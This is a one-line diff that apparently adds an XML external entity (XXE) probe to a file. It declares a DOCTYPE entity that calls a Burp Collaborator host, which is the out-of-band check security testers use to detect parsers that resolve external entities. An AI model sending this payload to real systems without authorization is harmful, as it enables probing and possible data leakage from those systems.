@@ -1,0 +1,1 @@
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://le30cn2iuheeu3lwi40wdsmhb8h25r.burpcollaborator.net/"> ]>
